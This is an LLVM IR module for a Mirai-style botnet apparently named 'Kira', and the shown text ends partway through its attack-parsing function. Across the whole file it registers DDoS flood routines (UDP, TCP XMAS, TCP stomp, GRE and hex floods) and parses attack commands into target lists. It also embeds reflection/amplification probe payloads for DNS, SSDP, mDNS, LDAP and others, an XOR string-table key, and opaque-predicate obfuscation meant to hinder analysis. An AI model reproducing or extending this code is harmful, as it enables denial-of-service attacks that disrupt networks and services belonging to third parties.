; ModuleID = 'host/ir_bcf/Kira.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_xmas_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.grehdr = type { i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [1 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\01\00\01\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\05\00\01\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"r\FE\1D\13\00\00\00\00\00\00\00\02\00\01\86\A0\00\01\97|\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"\D9\00\0A\FA\00\00\00\00\00\01\02\90\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C5\02\04\EC\ECB\EE\92\00", align 1
@.str.6 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.7 = private unnamed_addr constant [61 x i8] c"0:\02\01\030\0F\02\02Ji\02\03\00\FF\E3\04\01\04\02\01\03\04\100\0E\04\00\02\01\00\02\01\00\04\00\04\00\04\000\12\04\00\04\00\A0\0C\02\027\F0\02\01\00\02\01\000\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"\00\01\00\02\00\01\00\00", align 1
@.str.9 = private unnamed_addr constant [52 x i8] c"0\84\00\00\00-\02\01\07c\84\00\00\00$\04\00\0A\01\00\0A\01\00\02\01\00\02\01d\01\01\00\87\0BobjectClass0\84\00\00\00\00\00", align 1
@.str.10 = private unnamed_addr constant [54 x i8] c"\02\01\00\06 \00\00\00\00\00\01\00.n\00\00\00\15service:service-agent\00\07 default\00\00\00\00\00", align 1
@.str.11 = private unnamed_addr constant [157 x i8] c"\00\11\223DUfw\00\00\00\00\00\00\00\00\01\10\02\00\00\00\00\00\00\00\00\C0\00\00\00\A4\00\00\00\01\00\00\00\01\00\00\00\98\01\01\00\04\03\00\00$\01\01\00\00\80\01\00\05\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\02\01\00\00\80\01\00\05\80\02\00\01\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\03\01\00\00\80\01\00\01\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"\01\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"\06\00\FF\07\00\00\00\00\00\00\00\00\00\09 \18\C8\81\008\8E\04\B5\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"SNQUERY: 127.0.0.1:AAAAAA:xsvr\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"8d\C1x\01\B8\9B\CB\8F\00\00\00\00\00\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"\1E\00\010\02\FD\A8\E3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [174 x i8] c"M-SEARCH * HTTP/1.1\0D\0AHOST: 255.255.255.255:1900\0D\0AMAN: \22ssdp:discover\22\0D\0AMX: 1\0D\0AST: urn:dial-multiscreen-org:service:dial:1\0D\0AUSER-AGENT: Google Chrome/60.0.3112.90 Windows\0D\0A\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [47 x i8] c"\00\00\00\00\00\01\00\00\00\00\00\00\09_services\07_dns-sd\04_udp\05local\00\00\0C\00\01\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"xf4\BE\03\00\00\00\00\00\00\00\00\00\01\00\00\02x\BA\85\09TeamSpeak\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0AWindows XP\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00 \00<\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08nickname\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.21 = private unnamed_addr constant [163 x i8] c"\05\CA\7F\16\9C\11\F9\89\00\00\00\00\02\9Dt\8BE\AA{\EF\B9\9E\FE\AD\08\19\BA\CFA\E0\16\A22l\F3\CF\F4\8E<D\83\C8\8DQEo\90\95#>\00\97+\1Cq\B2N\C0a\F1\D7o\C5~\F6HR\BF\82j\A2;e\AA\18z\178\C3\81'\C3G\FC\A75\BA\FC\0F\9D\9Dr$\9D\FC\02\17mk\B1-r\C6\E3\17\1C\95\D9i\99W\CE\DD\DF\05\DC\03\94V\04:\14\E5\AD\9A+\140:#\A3%\AD\E8\E69\8A\85*\C6\DF\E5]-\A0/]\9C\D7+$\FB\B0\9C\C2\BA\89\B4\1B\17\A2\B6\00", align 1
@random_hex.hexs = private unnamed_addr constant [256 x i8] c"\00\01\02\03\04\05\06\07\08\09\0A\0B\0C\0D\0E\0F\10\11\12\13\14\15\16\17\18\19\1A\1B\1C\1D\1E\1F !\22#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\5C]^_`abcdefghijklmnopqrstuvwxyz{|}~\7F\80\81\82\83\84\85\86\87\88\89\8A\8B\8C\8D\8E\8F\90\91\92\93\94\95\96\97\98\99\9A\9B\9C\9D\9E\9F\A0\A1\A2\A3\A4\A5\A6\A7\A8\A9\AA\AB\AC\AD\AE\AF\B0\B1\B2\B3\B4\B5\B6\B7\B8\B9\BA\BB\BC\BD\BE\BF\C0\C1\C2\C3\C4\C5\C6\C7\C8\C9\CA\CB\CC\CD\CE\CF\D0\D1\D2\D3\D4\D5\D6\D7\D8\D9\DA\DB\DC\DD\DE\DF\E0\E1\E2\E3\E4\E5\E6\E7\E8\E9\EA\EB\EC\ED\EE\EF\F0\F1\F2\F3\F4\F5\F6\F7\F8\F9\FA\FB\FC\FD\FE\FF", align 16
@hexPayload = global i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [41 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -1287662771, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_nudp)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_stdhex)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udphex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #7
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #7
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %53, %0
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = load i32, i32* %1, align 4
  %12 = icmp slt i32 %11, 1
  %13 = load i32, i32* @x.5
  %14 = load i32, i32* @y.6
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %12, label %21, label %56

; <label>:21:                                     ; preds = %originalBBpart2
  %22 = load i32, i32* @x.5
  %23 = load i32, i32* @y.6
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %21
  %30 = load i32, i32* %1, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = icmp ne i32 %33, 0
  %35 = load i32, i32* @x.5
  %36 = load i32, i32* @y.6
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %34, label %43, label %49

; <label>:43:                                     ; preds = %originalBBpart24
  %44 = load i32, i32* %1, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %45
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @kill(i32 %47, i32 9) #7
  br label %49

; <label>:49:                                     ; preds = %43, %originalBBpart24
  %50 = load i32, i32* %1, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %51
  store i32 0, i32* %52, align 4
  br label %53

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %1, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %1, align 4
  br label %2

; <label>:56:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %57 = load i32, i32* %1, align 4
  %58 = icmp slt i32 %57, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %21
  %59 = load i32, i32* %1, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %60
  %62 = load i32, i32* %61, align 4
  %63 = icmp ne i32 %62, 0
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %33

; <label>:16:                                     ; preds = %2
  %17 = load i32, i32* @x.7
  %18 = load i32, i32* @y.8
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* @x.7
  %26 = load i32, i32* @y.8
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %347

; <label>:33:                                     ; preds = %2
  %34 = load i8*, i8** %3, align 8
  %35 = bitcast i8* %34 to i32*
  %36 = load i32, i32* %35, align 4
  %37 = call i32 @ntohl(i32 %36) #8
  store i32 %37, i32* %6, align 4
  %38 = load i8*, i8** %3, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  store i8* %39, i8** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = sext i32 %40 to i64
  %42 = sub i64 %41, 4
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %63

; <label>:46:                                     ; preds = %33
  %47 = load i32, i32* @x.7
  %48 = load i32, i32* @y.8
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* @x.7
  %56 = load i32, i32* @y.8
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %347

; <label>:63:                                     ; preds = %33
  %64 = load i8*, i8** %3, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %3, align 8
  %66 = load i8, i8* %64, align 1
  store i8 %66, i8* %7, align 1
  %67 = load i32, i32* %4, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 %68, 1
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %4, align 4
  %71 = load i32, i32* %4, align 4
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %73, label %90

; <label>:73:                                     ; preds = %63
  %74 = load i32, i32* @x.7
  %75 = load i32, i32* @y.8
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* @x.7
  %83 = load i32, i32* @y.8
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %347

; <label>:90:                                     ; preds = %63
  %91 = load i8*, i8** %3, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %3, align 8
  %93 = load i8, i8* %91, align 1
  store i8 %93, i8* %8, align 1
  %94 = load i32, i32* %4, align 4
  %95 = sext i32 %94 to i64
  %96 = sub i64 %95, 1
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %4, align 4
  %98 = load i8, i8* %8, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %90
  br label %347

; <label>:102:                                    ; preds = %90
  %103 = load i32, i32* %4, align 4
  %104 = sext i32 %103 to i64
  %105 = load i8, i8* %8, align 1
  %106 = zext i8 %105 to i64
  %107 = mul i64 5, %106
  %108 = icmp ult i64 %104, %107
  br i1 %108, label %109, label %126

; <label>:109:                                    ; preds = %102
  %110 = load i32, i32* @x.7
  %111 = load i32, i32* @y.8
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  %118 = load i32, i32* @x.7
  %119 = load i32, i32* @y.8
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %347

; <label>:126:                                    ; preds = %102
  %127 = load i8, i8* %8, align 1
  %128 = zext i8 %127 to i64
  %129 = call noalias i8* @calloc(i64 %128, i64 24) #7
  %130 = bitcast i8* %129 to %struct.attack_target*
  store %struct.attack_target* %130, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %131

; <label>:131:                                    ; preds = %178, %126
  %132 = load i32, i32* %5, align 4
  %133 = load i8, i8* %8, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp slt i32 %132, %134
  br i1 %135, label %136, label %181

; <label>:136:                                    ; preds = %131
  %137 = load i8*, i8** %3, align 8
  %138 = bitcast i8* %137 to i32*
  %139 = load i32, i32* %138, align 4
  %140 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %141 = load i32, i32* %5, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 1
  store i32 %139, i32* %144, align 4
  %145 = load i8*, i8** %3, align 8
  %146 = getelementptr inbounds i8, i8* %145, i64 4
  store i8* %146, i8** %3, align 8
  %147 = load i8*, i8** %3, align 8
  %148 = getelementptr inbounds i8, i8* %147, i32 1
  store i8* %148, i8** %3, align 8
  %149 = load i8, i8* %147, align 1
  %150 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %151 = load i32, i32* %5, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 2
  store i8 %149, i8* %154, align 4
  %155 = load i32, i32* %4, align 4
  %156 = sext i32 %155 to i64
  %157 = sub i64 %156, 5
  %158 = trunc i64 %157 to i32
  store i32 %158, i32* %4, align 4
  %159 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %160 = load i32, i32* %5, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i32 0, i32 0
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %163, i32 0, i32 0
  store i16 2, i16* %164, align 4
  %165 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %166 = load i32, i32* %5, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i32 0, i32 1
  %170 = load i32, i32* %169, align 4
  %171 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %172 = load i32, i32* %5, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i64 %173
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i32 0, i32 0
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %175, i32 0, i32 2
  %177 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %176, i32 0, i32 0
  store i32 %170, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %136
  %179 = load i32, i32* %5, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %5, align 4
  br label %131

; <label>:181:                                    ; preds = %131
  %182 = load i32, i32* @x.7
  %183 = load i32, i32* @y.8
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %181
  %190 = load i32, i32* %4, align 4
  %191 = sext i32 %190 to i64
  %192 = icmp ult i64 %191, 1
  %193 = load i32, i32* @x.7
  %194 = load i32, i32* @y.8
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %192, label %201, label %202

; <label>:201:                                    ; preds = %originalBBpart216
  br label %347

; <label>:202:                                    ; preds = %originalBBpart216
  %203 = load i8*, i8** %3, align 8
  %204 = getelementptr inbounds i8, i8* %203, i32 1
  store i8* %204, i8** %3, align 8
  %205 = load i8, i8* %203, align 1
  store i8 %205, i8* %9, align 1
  %206 = load i32, i32* %4, align 4
  %207 = sext i32 %206 to i64
  %208 = sub i64 %207, 1
  %209 = trunc i64 %208 to i32
  store i32 %209, i32* %4, align 4
  %210 = load i8, i8* %9, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp sgt i32 %211, 0
  br i1 %212, label %213, label %339

; <label>:213:                                    ; preds = %202
  %214 = load i32, i32* @x.7
  %215 = load i32, i32* @y.8
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %213
  %222 = load i8, i8* %9, align 1
  %223 = zext i8 %222 to i64
